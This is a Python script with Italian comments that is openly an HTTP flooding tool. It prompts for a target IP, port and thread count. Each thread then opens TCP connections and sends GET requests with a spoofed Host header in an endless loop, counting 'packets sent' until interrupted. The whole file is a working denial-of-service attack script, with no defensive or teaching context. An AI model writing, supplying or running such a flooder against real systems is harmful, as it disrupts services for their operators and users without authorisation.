import socket
import threading
import signal
import sys
import time

# Variabili globali
running = True  # Indica se il programma è in esecuzione
packet_count = 0  # Conta i pacchetti inviati
lock = threading.Lock()  # Per sincronizzare l'aggiornamento del contatore

# Funzione per gestire il segnale Ctrl+C
def stop_attack(signal, frame):
    global running
    print("\n[+] Interruzione ricevuta. Terminazione del programma...")
    running = False
    time.sleep(1)
    print(f"\n[+] Report finale: {packet_count} pacchetti inviati.")
    sys.exit(0)

# Associa il segnale SIGINT (Ctrl+C) alla funzione stop_attack
signal.signal(signal.SIGINT, stop_attack)

# Input utente
target = str(input("Enter Target IP: "))
port = int(input("Enter Port: "))
Tdr = int(input("Insert number of threads: "))
fake_ip = '44.197.175.168'

# Funzione di attacco
def attack():
    global running, packet_count
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Timeout per evitare blocchi
            s.connect((target, port))

            # Creazione della richiesta HTTP valida
            request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
            s.send(request.encode('ascii'))  # Usa send() invece di sendto()

            s.close()

            # Incrementa il conteggio pacchetti in modo sicuro
            with lock:
                packet_count += 1
                if packet_count % 10 == 0:  # Mostra un aggiornamento ogni 10 pacchetti
                    print(f"[+] Pacchetti inviati: {packet_count}")

        except ConnectionResetError:
            print("[-] Connection reset by target. Il server potrebbe bloccare le richieste.")
            break
        except Exception as e:
            print(f"[-] Errore: {e}")
            break

# Creazione e avvio dei thread
print("\n[+] Attacco iniziato...\n")
threads = []
for i in range(Tdr):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

# Attendi che tutti i thread terminino
for thread in threads:
    thread.join()